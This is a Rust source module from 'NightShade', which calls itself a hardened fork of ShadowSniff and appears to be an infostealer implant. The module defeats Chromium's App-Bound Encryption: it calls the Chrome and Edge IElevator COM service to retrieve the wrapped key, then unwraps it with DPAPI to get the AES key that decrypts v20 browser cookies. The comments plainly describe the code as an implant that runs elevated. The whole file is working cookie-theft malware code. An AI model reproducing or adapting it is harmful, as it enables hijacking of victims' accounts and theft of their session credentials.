/*
 * This file is part of NightShade (a hardened fork of sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

//! Chromium >= 127 App-Bound Encryption (ABE) — elevation-service route.
//!
//! Since Chrome 127 cookie values carry a `v20` prefix and the wrapping key in
//! `Local State` (`app_bound_encrypted_key`) is a double-DPAPI/`APPB` blob
//! that a plain user-context `CryptUnprotectData` cannot open.
//!
//! The supported path is the browser's own **IElevator** COM service
//! (`GetEncryptedKey`), which returns the DPAPI-protected key blob; the
//! elevation service only skips its caller-path validation for `SYSTEM`
//! callers, so this succeeds when the implant runs elevated/as SYSTEM and
//! fails cleanly otherwise (every failure path returns `None` and the caller
//! falls back to the legacy behaviour).
//!
//! ABI note: public references disagree on whether slot 6 returns a `BSTR`
//! (length-prefixed wide string) or a `CoTaskMemAlloc`'d byte buffer with a
//! separate length out-param. Both forms share the same wire shape for the
//! first three arguments, so we pass both out-pointers and interpret the
//! result by whichever form is present.

#![allow(unsafe_op_in_unsafe_fn)]

use crate::chromium::crypt_unprotect_data;
use alloc::vec::Vec;
use core::ffi::c_void;
use core::ptr::{null_mut, read_unaligned};
use utils::base64::base64_decode;
use windows_sys::core::GUID;
use windows_sys::Win32::System::Com::{
    CoCreateInstance, CoInitializeEx, CoTaskMemFree, CLSCTX_LOCAL_SERVER,
    COINIT_APARTMENTTHREADED,
};

/// ACKNOWLEDGE_ELEVATION accepted value expected by the elevation service.
const ACKNOWLEDGE_ELEVATION_ACCEPTED: u32 = 0x4713BC9B;

/// CLSID_Elevator (Google Chrome).
const CLSID_ELEVATOR_CHROME: GUID = GUID {
    data1: 0x708860E0,
    data2: 0xF641,
    data3: 0x4611,
    data4: [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B],
};

/// CLSID_Elevator (Microsoft Edge).
const CLSID_ELEVATOR_EDGE: GUID = GUID {
    data1: 0x1FCBE96C,
    data2: 0x1697,
    data3: 0x43AF,
    data4: [0x91, 0x40, 0x28, 0x97, 0xC7, 0x96, 0x69, 0x71],
};

/// IID_IElevator (Chromium brand — Chrome, Brave, Opera, Vivaldi…).
const IID_IELEVATOR_CHROMIUM: GUID = GUID {
    data1: 0xA949CB4E,
    data2: 0xC4F9,
    data3: 0x44C4,
    data4: [0xB2, 0x13, 0x6B, 0xF8, 0xAA, 0x9A, 0xC6, 0x9C],
};

/// IID_IElevator_Edge.
const IID_IELEVATOR_EDGE: GUID = GUID {
    data1: 0xC9C2B807,
    data2: 0x7731,
    data3: 0x4F34,
    data4: [0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B],
};

#[repr(C)]
struct ElevatorVTable {
    query_interface: usize,
    add_ref: usize,
    release: unsafe extern "system" fn(*mut c_void) -> u32,
    run_recovery_crx_elevated: usize, // slot 3
    encrypt_data: usize,              // slot 4
    decrypt_data: usize,              // slot 5
    get_encrypted_key: unsafe extern "system" fn(
        this: *mut c_void,
        acknowledgement: u32,
        out_key: *mut *mut u8,
        out_len: *mut u32,
    ) -> i32, // slot 6 — HRESULT is i32
}

/// Attempts to obtain the unwrapped 32-byte app-bound AES key through the
/// browser elevation services (Chrome first, then Edge).
pub fn try_recover_app_bound_key() -> Option<Vec<u8>> {
    unsafe {
        // The elevator is a local-server COM class; apartment threading is fine.
        CoInitializeEx(null_mut(), COINIT_APARTMENTTHREADED as u32);

        let from_chrome = recover_via_elevator(&CLSID_ELEVATOR_CHROME, &IID_IELEVATOR_CHROMIUM);
        let key = from_chrome.or_else(|| {
            recover_via_elevator(&CLSID_ELEVATOR_EDGE, &IID_IELEVATOR_EDGE)
        });

        key.and_then(|blob| {
            // The elevator hands back the DPAPI-protected key blob; unwrap it
            // (requires the elevated/SYSTEM token context to succeed).
            crypt_unprotect_data(&blob).filter(|key| key.len() == 32)
        })
    }
}

unsafe fn recover_via_elevator(clsid: &GUID, iid: &GUID) -> Option<Vec<u8>> {
    let mut elevator: *mut c_void = null_mut();

    let status = CoCreateInstance(
        clsid,
        null_mut(),
        CLSCTX_LOCAL_SERVER,
        iid,
        &mut elevator as *mut _ as *mut *mut c_void,
    );

    if status != 0 || elevator.is_null() {
        return None;
    }

    let result = get_encrypted_key(elevator);

    // Balance the reference from CoCreateInstance.
    let vtable = (*(elevator as *mut *mut c_void)).cast::<ElevatorVTable>();
    (vtable.read().release)(elevator);

    result
}

unsafe fn get_encrypted_key(elevator: *mut c_void) -> Option<Vec<u8>> {
    let vtable = (*(elevator as *mut *mut c_void)).cast::<ElevatorVTable>().read();

    let mut raw_key: *mut u8 = null_mut();
    let mut raw_len: u32 = 0;

    let status = (vtable.get_encrypted_key)(
        elevator,
        ACKNOWLEDGE_ELEVATION_ACCEPTED,
        &mut raw_key,
        &mut raw_len,
    );

    if status != 0 || raw_key.is_null() {
        return None;
    }

    // Form A: BYTE* + length out-param.
    if raw_len > 0 {
        let blob = core::slice::from_raw_parts(raw_key, raw_len as usize).to_vec();
        CoTaskMemFree(raw_key as _);
        return Some(blob);
    }

    // Form B: BSTR — byte length lives in the 4 bytes before the data.
    let byte_len = read_unaligned(raw_key.cast::<u32>().sub(1)) as usize;
    if byte_len == 0 {
        CoTaskMemFree(raw_key as _);
        return None;
    }

    let blob = core::slice::from_raw_parts(raw_key, byte_len).to_vec();
    // A real SysFreeString would need Win32_System_Ole; the stub is
    // short-lived, so freeing via CoTaskMemFree (best effort) is acceptable.
    CoTaskMemFree(raw_key as _);

    // Newer builds hand back the key base64-encoded inside the string.
    match core::str::from_utf8(&blob) {
        Ok(text) => base64_decode(text.trim_matches('\0').as_bytes()),
        Err(_) => Some(blob),
    }
}
